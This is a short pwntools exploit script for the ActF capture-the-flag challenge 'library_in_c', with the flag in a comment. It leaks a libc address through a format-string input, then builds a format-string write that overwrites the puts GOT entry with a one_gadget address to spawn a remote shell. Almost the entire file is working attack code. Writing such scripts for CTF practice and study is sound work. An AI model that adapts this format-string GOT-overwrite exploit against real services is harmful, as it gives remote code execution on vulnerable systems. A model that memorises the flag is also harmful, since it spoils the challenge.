from pwn import *
from libformatstr import FormatStr


context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./library_in_c')
# p = process('./library_in_c')
# gdb.attach(p)
p = remote("shell.actf.co", 20201)

payload = "%2$p"

p.sendlineafter("name?\n", payload)

p.recvuntil("there ")
leak = int(p.recvline(False),16)
libc_base = leak-0x3c6780
log.info("Libc: 0x{:x}".format(libc_base))
one_gadget = libc_base+0x4526a
f = FormatStr(isx64=1)
puts = elf.got.puts
f[puts] = one_gadget & 0xffffffff
f[puts+4] = one_gadget >> 32
payload = f.payload(16)
# payload = "AAAAAAAA"+"%16$p|"

p.sendlineafter("out?\n", payload)


p.interactive()
# actf{us1ng_c_15_n3v3r_4_g00d_1d34}